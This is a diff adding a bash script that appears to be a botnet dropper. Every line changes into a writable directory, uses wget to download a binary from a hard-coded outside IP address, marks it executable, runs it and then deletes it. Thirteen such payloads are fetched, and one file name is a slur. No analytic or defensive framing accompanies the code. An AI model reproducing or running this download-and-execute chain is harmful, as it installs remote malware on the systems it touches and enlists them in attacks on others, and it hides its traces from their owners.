@@ -1,0 +1,14 @@
+#!/bin/bash
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.165.29.76/dank; chmod +x dank; ./dank; rm -rf dank
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.165.29.76/eleven; chmod +x eleven; ./eleven; rm -rf eleven
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.165.29.76/papa; chmod +x papa; ./papa; rm -rf papa
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.165.29.76/loise; chmod +x loise; ./loise; rm -rf loise
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.165.29.76/kemy; chmod +x kemy; ./kemy; rm -rf kemy
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.165.29.76/lose; chmod +x lose; ./lose; rm -rf lose
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.165.29.76/dad; chmod +x dad; ./dad; rm -rf dad
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.165.29.76/michael; chmod +x michael; ./michael; rm -rf michael
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.165.29.76/retard; chmod +x retard; ./retard; rm -rf retard
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.165.29.76/lko; chmod +x lko; ./lko; rm -rf lko
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.165.29.76/' '; chmod +x ' '; ./' '; rm -rf ' '
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.165.29.76/dre; chmod +x dre; ./dre; rm -rf dre
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.165.29.76/lace; chmod +x lace; ./lace; rm -rf lace
